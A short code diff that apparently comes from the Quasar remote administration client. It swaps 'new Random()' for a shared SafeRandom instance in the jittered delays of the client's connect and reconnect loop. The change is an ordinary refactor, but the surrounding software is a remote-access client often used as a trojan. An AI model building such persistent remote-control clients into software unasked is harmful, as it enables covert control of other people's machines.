@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Threading;
 using System.Windows.Forms;
 using Quasar.Common.Messages;
+using Quasar.Common.Utilities;
 using xClient.Config;
 using xClient.Core.Commands;
 using xClient.Core.Data;
@@ -18,10 +19,12 @@ namespace xClient.Core.Networking
         public static bool Exiting { get; private set; }
         public bool Authenticated { get; private set; }
         private readonly HostsManager _hosts;
+        private readonly SafeRandom _random;
 
         public QuasarClient(HostsManager hostsManager) : base()
         {
             this._hosts = hostsManager;
+            this._random = new SafeRandom();
             base.ClientState += OnClientState;
             base.ClientRead += OnClientRead;
             base.ClientFail += OnClientFail;
@@ -33,7 +36,7 @@ namespace xClient.Core.Networking
             {
                 if (!Connected)
                 {
-                    Thread.Sleep(100 + new Random().Next(0, 250));
+                    Thread.Sleep(100 + _random.Next(0, 250));
 
                     Host host = _hosts.GetNextHost();
 
@@ -56,7 +59,7 @@ namespace xClient.Core.Networking
                     return;
                 }
 
-                Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));
+                Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
             }
         }
 
